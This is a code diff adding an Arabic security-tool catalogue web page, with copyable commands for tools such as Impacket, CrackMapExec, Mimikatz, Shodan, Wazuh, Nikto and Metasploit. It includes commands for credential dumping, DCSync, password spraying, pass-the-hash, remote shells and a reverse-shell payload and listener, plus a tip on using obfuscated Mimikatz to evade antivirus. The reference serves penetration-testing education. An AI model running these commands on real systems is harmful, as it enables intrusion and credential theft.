+  features: ['SMB/LDAP/Kerberos/WMI', 'Pass-the-Hash وPass-the-Ticket', 'DCSync وSecretsDump', 'AS-REP Roasting وKerberoasting', 'Remote Command Execution'],
+  install: 'sudo apt install python3-impacket impacket-scripts -y\n# أو:\npip3 install impacket',
+  version: 'impacket-smbclient --version',
+  commands: [
+    { cmd: 'impacket-secretsdump corp.local/admin:pass@DC_IP', note: 'استخراج كل هاشات AD' },
+    { cmd: 'impacket-GetUserSPNs corp.local/user:pass -dc-ip DC_IP -outputfile kerb.txt', note: 'Kerberoasting' },
+    { cmd: 'impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip DC_IP', note: 'AS-REP Roasting' },
+    { cmd: 'impacket-psexec corp.local/admin@TARGET_IP', note: 'Remote Shell عبر SMB' },
+    { cmd: 'impacket-wmiexec corp.local/admin:pass@TARGET_IP', note: 'Remote Shell عبر WMI' },
+  ],
+  tips: ['💡 استخدم -hashes LM:NTLM لـ Pass-the-Hash', '⚠️ secretsdump يتطلب صلاحيات Domain Admin'],
+  related: ['CrackMapExec', 'BloodHound', 'Mimikatz'],
+},
+{
+  id: 91, name: 'CrackMapExec', icon: '🗺️', color: 'rgba(255,0,100,0.12)',
+  short: 'Swiss Army Knife لاختبار Active Directory',
+  cat: 'exploitation', tags: ['exploitation','active-directory','network'],
+  desc: `CrackMapExec (CME) أداة شاملة لاختبار Active Directory عبر SMB/LDAP/WinRM/MSSQL. تفحص عشرات الأجهزة دفعة واحدة، تختبر Credentials، تُنفّذ أوامر، وتُعدد المستخدمين والمشاركات.`,
+  features: ['فحص آلاف الأجهزة دفعة واحدة', 'Password Spraying', 'Pass-the-Hash', 'تنفيذ أوامر عن بُعد', 'تعداد Users/Groups/Shares'],
+  install: 'sudo apt install crackmapexec -y',
+  version: 'crackmapexec --version',
+  commands: [
+    { cmd: 'crackmapexec smb 192.168.1.0/24', note: 'اكتشاف أجهزة Windows في الشبكة' },
+    { cmd: 'crackmapexec smb 192.168.1.0/24 -u admin -p password --shares', note: 'فحص المشاركات' },
+    { cmd: 'crackmapexec smb TARGET -u users.txt -p "Password123" --continue-on-success', note: 'Password Spraying' },
+    { cmd: 'crackmapexec smb TARGET -u admin -H NTLM_HASH', note: 'Pass-the-Hash' },
+    { cmd: 'crackmapexec smb TARGET -u admin -p pass -x "whoami"', note: 'تنفيذ أمر عن بُعد' },
+  ],
+  tips: ['⚠️ Password Spraying قد يقفل الحسابات — احذر من lockout policy', '💡 --no-bruteforce مع قائمة credentials'],
+  related: ['Impacket', 'BloodHound', 'Responder'],
+},
+{
+  id: 92, name: 'BloodHound', icon: '🩸', color: 'rgba(200,0,50,0.12)',
+  short: 'تحليل وتصور مسارات الهجوم في Active Directory',
+  cat: 'exploitation', tags: ['exploitation','active-directory'],
+  desc: `BloodHound يُصوّر علاقات Active Directory كـ Graph ويجد أقصر مسار لـ Domain Admin. يستخدم Neo4j للتخزين وواجهة رسومية لعرض المسارات. أداة لا غنى عنها في Red Team.`,
+  features: ['Graph قابل للاستعراض', 'أقصر مسار لـ Domain Admin', 'اكتشاف Kerberoastable Accounts', 'ACL Abuse Paths', 'Attack Path Enumeration'],
+  install: 'sudo apt install bloodhound neo4j -y',
+  version: 'bloodhound --version',
+  commands: [
+    { cmd: '# تشغيل Neo4j:\nneo4j console\n# ثم:\nbloodhound &', note: 'تشغيل BloodHound' },
+    { cmd: 'bloodhound-python -u user -p pass -ns DC_IP -d corp.local -c All', note: 'جمع بيانات AD (Python Collector)' },
+    { cmd: '# SharpHound على Windows:\n.\\SharpHound.exe -c All\n# أو:\nInvoke-BloodHound -CollectionMethod All', note: 'جمع بيانات بـ SharpHound' },
+    { cmd: '# بعد رفع الملفات في BloodHound:\n# Queries > Find Shortest Paths to Domain Admins', note: 'إيجاد مسار Domain Admin' },
+  ],
+  tips: ['💡 استخدم Pre-Built Queries للبدء السريع', '💡 Mark Domain Admin كـ High Value Target'],
+  related: ['Impacket', 'CrackMapExec', 'Mimikatz'],
+},
+{
+  id: 93, name: 'Mimikatz', icon: '🐱', color: 'rgba(255,150,0,0.12)',
+  short: 'استخراج Credentials من ذاكرة Windows',
+  cat: 'exploitation', tags: ['exploitation','windows','active-directory','password'],
+  desc: `Mimikatz الأداة الأشهر لاستخراج كلمات المرور والـ Hashes من ذاكرة Windows. تستخرج NTLM Hashes وPlaintext Passwords وKerberos Tickets. تُستخدم في Pass-the-Hash وPass-the-Ticket.`,
+  features: ['استخراج NTLM Hashes', 'Plaintext Passwords من LSASS', 'Kerberos Ticket Extraction', 'Pass-the-Hash وPass-the-Ticket', 'Golden/Silver Ticket'],
+  install: '# https://github.com/gentilkiwi/mimikatz/releases\n# داخل Metasploit:\nload kiwi',
+  version: 'mimikatz # version',
+  commands: [
+    { cmd: 'privilege::debug\nsekurlsa::logonpasswords', note: 'استخراج Passwords من الذاكرة' },
+    { cmd: 'privilege::debug\nlsadump::sam', note: 'استخراج SAM Database' },
+    { cmd: 'sekurlsa::tickets /export', note: 'تصدير Kerberos Tickets' },
+    { cmd: 'kerberos::ptt ticket.kirbi', note: 'Pass-the-Ticket' },
+    { cmd: 'lsadump::dcsync /domain:corp.local /user:Administrator', note: 'DCSync لسرقة هاشات AD' },
+  ],
+  tips: ['⚠️ يحتاج SYSTEM أو Admin privileges', '💡 AV يكتشف mimikatz.exe — استخدم obfuscated version'],
+  related: ['Impacket', 'CrackMapExec', 'BloodHound'],
+},
+{
+  id: 94, name: 'Shodan', icon: '👁️', color: 'rgba(255,50,50,0.12)',
+  short: 'محرك بحث الأجهزة المتصلة بالإنترنت',
+  cat: 'recon', tags: ['recon','osint','iot'],
+  desc: `Shodan محرك بحث يفهرس الأجهزة المتصلة بالإنترنت: خوادم، كاميرات، أجهزة IoT، قواعد بيانات. يُستخدم لـ OSINT واكتشاف Assets المكشوفة. يحتاج API Key للاستخدام الكامل.`,
+  features: ['فهرسة ملايين الأجهزة', 'فلترة بـ Port/OS/Country/Org', 'CVE Search', 'SSL Certificates Analysis', 'Shodan CLI وAPI'],
+  install: 'pip3 install shodan\nshodan init YOUR_API_KEY',
+  version: 'shodan version',
+  commands: [
+    { cmd: 'shodan search "apache" country:SA', note: 'بحث عن Apache في السعودية' },
+    { cmd: 'shodan search "port:3306 mysql" country:AE', note: 'قواعد بيانات MySQL مكشوفة' },
+    { cmd: 'shodan host 8.8.8.8', note: 'معلومات عن IP محدد' },
+    { cmd: 'shodan search "org:TargetCorp" --fields ip_str,port,org', note: 'أجهزة شركة محددة' },
+    { cmd: 'shodan search "ssl.cert.subject.CN:*.target.com"', note: 'شهادات SSL للهدف' },
+  ],
+  tips: ['💡 shodan.io/dashboard للواجهة الرسومية', '💡 Alerts لمراقبة شبكتك تلقائياً'],
+  related: ['Censys', 'FOFA', 'theHarvester'],
+},
+{
+  id: 95, name: 'Volatility 3', icon: '🧠', color: 'rgba(100,255,200,0.12)',
+  short: 'تحليل ذاكرة الـ RAM للكشف عن البرامج الخبيثة',
+  cat: 'forensics', tags: ['forensics','malware','windows'],
+  desc: `Volatility 3 إطار تحليل الذاكرة الرائد. يستخرج من RAM Dump: العمليات، الاتصالات، الهاشات، البرامج المحقونة، مفاتيح Registry. أساسي في Incident Response وMalware Analysis.`,
+  features: ['دعم Windows/Linux/macOS', 'استخراج Process/Network/Registry', 'كشف Code Injection', 'Plugin Architecture قابل للتوسع', 'يعمل بدون رموز تصحيح'],
+  install: 'sudo apt install python3-volatility3 -y\n# أو:\npip3 install volatility3',
+  version: 'vol -h | head -5',
+  commands: [
+    { cmd: 'vol -f memory.dmp windows.pslist', note: 'قائمة العمليات الجارية' },
+    { cmd: 'vol -f memory.dmp windows.pstree', note: 'شجرة العمليات (Parent/Child)' },
+    { cmd: 'vol -f memory.dmp windows.netstat', note: 'الاتصالات الشبكية' },
+    { cmd: 'vol -f memory.dmp windows.hashdump', note: 'استخراج هاشات كلمات المرور' },
+    { cmd: 'vol -f memory.dmp windows.malfind', note: 'كشف الكود الخبيث المحقون' },
+    { cmd: 'vol -f memory.dmp linux.pslist', note: 'العمليات على Linux RAM' },
+  ],
+  tips: ['💡 vol -f memory.dmp windows.info لمعرفة نظام التشغيل', '💡 استخدم Dumpit أو winpmem لأخذ Memory Dump'],
+  related: ['Autopsy', 'Rekall', 'LiME'],
+},
+{
+  id: 96, name: 'Wazuh', icon: '🛡️', color: 'rgba(0,150,255,0.12)',
+  short: 'SIEM/XDR مفتوح المصدر للمراقبة الأمنية',
+  cat: 'defensive', tags: ['defensive','siem','monitoring'],
+  desc: `Wazuh منصة أمنية مفتوحة المصدر تجمع HIDS وSIEM وXDR. تراقب Logs وتكتشف التهديدات وتُنبّه على الحوادث. تدعم آلاف الـ Rules وتتكامل مع Elastic Stack.`,
+  features: ['Log Analysis وAlert Generation', 'File Integrity Monitoring', 'Vulnerability Detection', 'Compliance (PCI-DSS, HIPAA)', 'Active Response'],
+  install: '# Docker (الأسهل):\ncurl -sO https://packages.wazuh.com/4.7/wazuh-install.sh\nbash wazuh-install.sh -a',
+  version: '/var/ossec/bin/wazuh-control info',
+  commands: [
+    { cmd: 'sudo systemctl status wazuh-manager', note: 'حالة Wazuh Manager' },
+    { cmd: 'sudo /var/ossec/bin/ossec-logtest', note: 'اختبار Rule على Log' },
+    { cmd: '# تثبيت Agent (Ubuntu):\napt install wazuh-agent\necho "WAZUH_MANAGER=SERVER_IP" >> /etc/wazuh-agent/ossec.conf\nsystemctl start wazuh-agent', note: 'تثبيت Agent على Endpoint' },
+    { cmd: 'tail -f /var/ossec/logs/alerts/alerts.log', note: 'مراقبة التنبيهات مباشرة' },
+  ],
+  tips: ['💡 https://localhost:443 للـ Dashboard', '💡 اربطه مع VirusTotal API للكشف عن Malware'],
+  related: ['ELK Stack', 'Splunk', 'Suricata'],
+},
+{
+  id: 97, name: 'Maltego', icon: '🕸️', color: 'rgba(200,100,255,0.12)',
+  short: 'OSINT وتحليل العلاقات البصري',
+  cat: 'recon', tags: ['recon','osint'],
+  desc: `Maltego أداة OSINT رائدة لاكتشاف وتصوير العلاقات بين الكيانات: أشخاص، نطاقات، IPs، شركات، حسابات. تُستخدم في التحقيقات الجنائية واختبار الاختراق.`,
+  features: ['200+ Transform للبحث التلقائي', 'Graph تفاعلي للعلاقات', 'تكامل مع Shodan وHaveIBeenPwned', 'تصدير التقارير', 'Community Edition مجانية'],
+  install: 'sudo apt install maltego -y\n# أو تحميل من: https://maltego.com',
+  version: 'maltego &',
+  commands: [
+    { cmd: 'maltego &', note: 'فتح واجهة Maltego الرسومية' },
+    { cmd: '# داخل Maltego:\n# New Graph > Add Entity: Domain\n# اكتب target.com\n# Run All Transforms', note: 'استطلاع نطاق كامل' },
+    { cmd: '# CLI (لا تدعم كل الميزات):\nmaltego -nogui -t domain.mt', note: 'تشغيل Maltego بدون واجهة' },
+  ],
+  tips: ['💡 استخدم Community Edition للمشاريع الصغيرة', '💡 Transforms من Shodan وVirusTotal قوية جداً'],
+  related: ['theHarvester', 'Amass', 'Recon-ng'],
+},
+{
+  id: 98, name: 'Nikto', icon: '🔎', color: 'rgba(0,200,150,0.12)',
+  short: 'فاحص ثغرات خوادم الويب الكلاسيكي',
+  cat: 'webapp', tags: ['webapp','scanning'],
+  desc: `Nikto فاحص خوادم ويب مفتوح المصدر يفحص آلاف المشكلات المعروفة: Misconfigurations، ملفات خطيرة، إصدارات قديمة، Headers مفقودة. سريع وسهل وأساسي في Web Pentesting.`,
+  features: ['6700+ اختبار لخوادم الويب', 'فحص Headers الأمنية', 'كشف ملفات حساسة', 'اختبار SSL/TLS', 'تصدير HTML/XML/CSV'],
+  install: 'sudo apt install nikto -y',
+  version: 'nikto -Version',
+  commands: [
+    { cmd: 'nikto -h http://target.com', note: 'فحص أساسي' },
+    { cmd: 'nikto -h https://target.com -ssl', note: 'فحص HTTPS' },
+    { cmd: 'nikto -h target.com -p 8080', note: 'فحص منفذ محدد' },
+    { cmd: 'nikto -h target.com -o report.html -Format html', note: 'حفظ تقرير HTML' },
+    { cmd: 'nikto -h target.com -useproxy http://127.0.0.1:8080', note: 'عبر Burp Proxy' },
+  ],
+  tips: ['💡 اجمعه مع Burp Suite للاختبار الشامل', '⚠️ يترك آثاراً واضحة في الـ Logs'],
+  related: ['OWASP ZAP', 'Burp Suite', 'Nuclei'],
+},
+{
+  id: 99, name: 'Trivy', icon: '🔬', color: 'rgba(0,255,150,0.12)',
+  short: 'فحص ثغرات Container Images وملفات IaC',
+  cat: 'scanning', tags: ['scanning','devops','container'],
+  desc: `Trivy من Aqua Security أسرع وأشمل أداة لفحص ثغرات Containers وKubernetes وملفات IaC وملفات Dependencies. تُدمج في CI/CD Pipelines. تفحص OS Packages وLanguage Libraries.`,
+  features: ['فحص Docker Images', 'Kubernetes Cluster Scan', 'IaC Scan (Terraform, CloudFormation)', 'Dependency Scan (npm, pip, maven)', 'SBOM Generation'],
+  install: 'sudo apt install trivy -y\n# أو:\ncurl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh',
+  version: 'trivy --version',
+  commands: [
+    { cmd: 'trivy image nginx:latest', note: 'فحص Docker Image' },
+    { cmd: 'trivy image --severity HIGH,CRITICAL myapp:1.0', note: 'الثغرات الخطيرة فقط' },
+    { cmd: 'trivy fs /path/to/project', note: 'فحص مشروع محلي' },
+    { cmd: 'trivy k8s --report summary cluster', note: 'فحص Kubernetes Cluster' },
+    { cmd: 'trivy config ./terraform', note: 'فحص ملفات Terraform (IaC)' },
+  ],
+  tips: ['💡 trivy image --ignore-unfixed لتجاهل الثغرات بدون إصلاح', '💡 أدمجه في GitHub Actions'],
+  related: ['Docker Bench', 'kube-bench', 'Snyk'],
+},
+{
+  id: 100, name: 'Metasploit Pro', icon: '💼', color: 'rgba(255,0,128,0.12)',
+  short: 'منصة اختبار الاختراق الاحترافية الشاملة',
+  cat: 'exploitation', tags: ['exploitation','scanning','password'],
+  desc: `Metasploit Framework أشهر إطار اختبار اختراق في العالم. يحتوي على 2000+ Exploit وأدوات Post-Exploitation وSocial Engineering. يُستخدم من المبتدئ حتى الخبير في Red Team Operations.`,
+  features: ['2000+ Exploit جاهز', 'Meterpreter Shell متقدم', 'Auxiliary Scanners', 'Post-Exploitation Modules', 'Payload Generation بـ msfvenom'],
+  install: 'sudo apt install metasploit-framework -y\n# تهيئة قاعدة البيانات:\nmsfdb init',
+  version: 'msfconsole -version',
+  commands: [
+    { cmd: 'msfdb init && msfconsole', note: 'تشغيل Metasploit مع قاعدة البيانات' },
+    { cmd: 'search type:exploit platform:windows', note: 'البحث عن Exploits لـ Windows' },
+    { cmd: 'use exploit/multi/handler\nset LHOST 0.0.0.0\nset LPORT 4444\nexploit -j', note: 'Listener للـ Reverse Shell' },
+    { cmd: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o payload.exe', note: 'إنشاء Payload' },
+    { cmd: '# بعد الدخول لـ Meterpreter:\nsysinfo\nhashdump\nrun post/multi/recon/local_exploit_suggester', note: 'Post-Exploitation' },
+  ],
+  tips: ['💡 msfdb start قبل msfconsole لنتائج منظمة', '⚠️ استخدمه فقط على أنظمة مرخّص باختبارها'],
+  related: ['Armitage', 'Cobalt Strike', 'Empire'],
+},
+]; // END OF TOOLS DATABASE
+
+// ============================================================
+// LOGIC
+// ============================================================
+let activeCat = 'all';
+let searchTerm = '';
+let sortMode = 'default';
+let currentToolData = null;
+
+function getFiltered() {
+  return TOOLS.filter(t => {
+    const matchCat = activeCat === 'all' || t.cat === activeCat || (t.tags && t.tags.includes(activeCat));
+    const q = searchTerm.toLowerCase();
+    const matchSearch = !q ||
+      t.name.toLowerCase().includes(q) ||
+      t.short.toLowerCase().includes(q) ||
+      (t.desc && t.desc.toLowerCase().includes(q)) ||
+      (t.tags && t.tags.some(tag => tag.includes(q)));
+    return matchCat && matchSearch;
+  }).sort((a,b) => {
+    if (sortMode === 'name') return a.name.localeCompare(b.name);
+    if (sortMode === 'cat') return a.cat.localeCompare(b.cat);
+    return a.id - b.id;
+  });
+}
+
+function setCat(cat, el) {
+  activeCat = cat;
+  document.querySelectorAll('.tool-cat-btn').forEach(b => b.classList.remove('active'));
+  el.classList.add('active');
+  renderTools();
+}
+
+function filterTools() {
+  searchTerm = document.getElementById('toolSearch').value;
+  renderTools();
+}
+
+function sortTools(val) {
+  sortMode = val;
+  renderTools();
+}
+
+const TAG_LABELS = {
+  scanning: { cls: 'tag-network', label: 'مسح' },
+  recon: { cls: 'tag-recon', label: 'استطلاع' },
+  exploit: { cls: 'tag-exploit', label: 'استغلال' },
+  web: { cls: 'tag-web', label: 'ويب' },
+  wireless: { cls: 'tag-wireless', label: 'WiFi' },
+  password: { cls: 'tag-password', label: 'كلمات مرور' },
+  forensics: { cls: 'tag-forensics', label: 'جنائي' },
+  network: { cls: 'tag-network', label: 'شبكات' },
+  malware: { cls: 'tag-malware', label: 'برمجيات خبيثة' },
+  privesc: { cls: 'tag-privesc', label: 'رفع صلاحيات' },
+  social: { cls: 'tag-social', label: 'هندسة اجتماعية' },
+  ctf: { cls: 'tag-ctf', label: 'CTF' },
+  linux: { cls: 'tag-linux', label: 'لينكس' },
+};
+
+function renderTools() {
+  const filtered = getFiltered();
+  const grid = document.getElementById('toolsGrid');
+  const noTools = document.getElementById('noTools');
+  document.getElementById('shown-count').textContent = filtered.length;
+
+  if (filtered.length === 0) {
+    grid.innerHTML = '';
+    noTools.style.display = '';
+    return;
+  }
+  noTools.style.display = 'none';
+
+  grid.innerHTML = filtered.map(t => {
+    const tagsHtml = (t.tags || []).slice(0, 3).map(tag => {
+      const info = TAG_LABELS[tag] || { cls: 'tag-network', label: tag };
+      return `<span class="tool-tag ${info.cls}">${info.label}</span>`;
+    }).join('');
+
+    return `
+      <div class="tool-card" onclick="openTool(${t.id})">
+        <div class="tool-card-top">
+          <div class="tool-logo" style="background:${t.color}">${t.icon}</div>
+          <div class="tool-info">
+            <div class="tool-name">${t.name}</div>
+            <div class="tool-short">${t.short}</div>
+          </div>
+        </div>
+        <div class="tool-tags">${tagsHtml}</div>
+        <div class="tool-footer">
+          <span class="tool-install">${t.install ? '$ ' + t.install.split('\n')[0].substring(0, 40) : ''}</span>
+          <span class="tool-open-btn"><i class="fas fa-chevron-left"></i></span>
+        </div>
+      </div>
+    `;
+  }).join('');
+}
+
+function openTool(id) {
+  const t = TOOLS.find(x => x.id === id);
+  if (!t) return;
+  currentToolData = t;
+
+  document.getElementById('mIcon').textContent = t.icon;
+  document.getElementById('mIcon').style.background = t.color;
+  document.getElementById('mName').textContent = t.name;
+  document.getElementById('mShort').textContent = t.short;
+
+  let html = '';
+
+  // Description
+  html += `<div class="modal-section">
+    <div class="modal-section-title"><i class="fas fa-info-circle"></i> نبذة عن الأداة</div>
+    <div class="modal-desc">${t.desc}</div>
+  </div>`;
+
+  // Features
+  if (t.features && t.features.length) {
+    html += `<div class="modal-section">
+      <div class="modal-section-title"><i class="fas fa-star"></i> المميزات الرئيسية</div>
+      <ul class="modal-features">
+        ${t.features.map(f => `<li>${f}</li>`).join('')}
+      </ul>
+    </div>`;
+  }
+
+  // Install
+  if (t.install) {
+    html += `<div class="modal-section">
+      <div class="modal-section-title"><i class="fas fa-download"></i> التثبيت</div>
+      <div class="install-box">
+        ${t.install.split('\n').map(line => `<div class="install-cmd">${escH(line)}</div>`).join('')}
+      </div>
+    </div>`;
+  }
+
+  // Commands
+  if (t.commands && t.commands.length) {
+    html += `<div class="modal-section">
+      <div class="modal-section-title"><i class="fas fa-terminal"></i> أوامر أساسية</div>
+      ${t.commands.map(c => `
+        <div class="modal-cmd">
+          <div style="flex:1;overflow:hidden;">
+            <code>${escH(c.cmd)}</code>
+            ${c.note ? `<span class="mc-note"># ${escH(c.note)}</span>` : ''}
+          </div>
+          <button class="copy-modal-btn" onclick="copyCmd('${escJ(c.cmd)}',this)">نسخ</button>
+        </div>
+      `).join('')}
+    </div>`;
+  }
+
+  // Tips
+  if (t.tips && t.tips.length) {
+    html += `<div class="modal-section">
+      <div class="modal-section-title"><i class="fas fa-lightbulb"></i> نصائح وتحذيرات</div>
+      ${t.tips.map(tip => {
+        if (tip.startsWith('⚠️')) return `<div class="modal-warning">${tip}</div>`;
+        return `<div class="modal-tip">${tip}</div>`;
+      }).join('')}
+    </div>`;
+  }
+
+  // Related
+  if (t.related && t.related.length) {
+    html += `<div class="modal-section">
+      <div class="modal-section-title"><i class="fas fa-link"></i> أدوات ذات صلة</div>
+      <div class="related-tools">
+        ${t.related.map(r => `<span class="related-tool-btn" onclick="searchRelated('${r}')">${r}</span>`).join('')}
+      </div>
+    </div>`;
+  }
+
+  document.getElementById('mBody').innerHTML = html;
+  document.getElementById('toolModal').style.display = 'flex';
+  document.body.style.overflow = 'hidden';
+}
+
+function closeToolModal(e) {
+  if (e.target === document.getElementById('toolModal')) closeToolModalDirect();
+}
+function closeToolModalDirect() {
+  document.getElementById('toolModal').style.display = 'none';
+  document.body.style.overflow = '';
+}
+
+function searchRelated(name) {
+  closeToolModalDirect();
+  document.getElementById('toolSearch').value = name;
+  searchTerm = name;
+  activeCat = 'all';
+  document.querySelectorAll('.tool-cat-btn').forEach(b => b.classList.remove('active'));
+  document.querySelector('[data-cat="all"]').classList.add('active');
+  renderTools();
+}
+
+function copyCmd(text, btn) {
+  navigator.clipboard.writeText(text).then(() => {
+    if (btn) { const orig = btn.textContent; btn.textContent = '✓ تم'; setTimeout(() => { btn.textContent = orig; }, 1500); }
+    showToolNotif('✅ تم النسخ!');
+  }).catch(() => {
+    const ta = document.createElement('textarea');
+    ta.value = text; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta);
+    showToolNotif('✅ تم النسخ!');
+  });
+}
+
+function showToolNotif(msg) {
+  const n = document.getElementById('tool-notif');
+  n.textContent = msg; n.classList.add('show');
+  setTimeout(() => n.classList.remove('show'), 2000);
+}
+
+function escH(s) { return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
+function escJ(s) { return String(s).replace(/\\/g,'\\\\').replace(/'/g,"\\'").replace(/\n/g,'\\n'); }
+
+// Keyboard ESC
+document.addEventListener('keydown', e => {
+  if (e.key === 'Escape') closeToolModalDirect();
+});
+
+// Hamburger menu
+document.addEventListener('DOMContentLoaded', () => {
+  const h = document.querySelector('.hamburger');
+  const m = document.querySelector('.mobile-menu');
+  if (h && m) h.addEventListener('click', () => {
+    h.classList.toggle('active');
+    m.classList.toggle('active');
+  });
+});
+
+// URL params
+const urlParams = new URLSearchParams(window.location.search);
+const urlCat = urlParams.get('cat');
+if (urlCat) {
+  activeCat = urlCat;
+  const btn = document.querySelector(`[data-cat="${urlCat}"]`);
+  if (btn) { document.querySelectorAll('.tool-cat-btn').forEach(b => b.classList.remove('active')); btn.classList.add('active'); }
+}
+const urlSearch = urlParams.get('q');
+if (urlSearch) { searchTerm = urlSearch; const si = document.getElementById('toolSearch'); if(si) si.value = urlSearch; }
+
+// Init
+document.getElementById('total-count').textContent = TOOLS.length;
+document.getElementById('tools-total-badge').textContent = TOOLS.length;
+renderTools();
+</script>
+</body>
+</html>
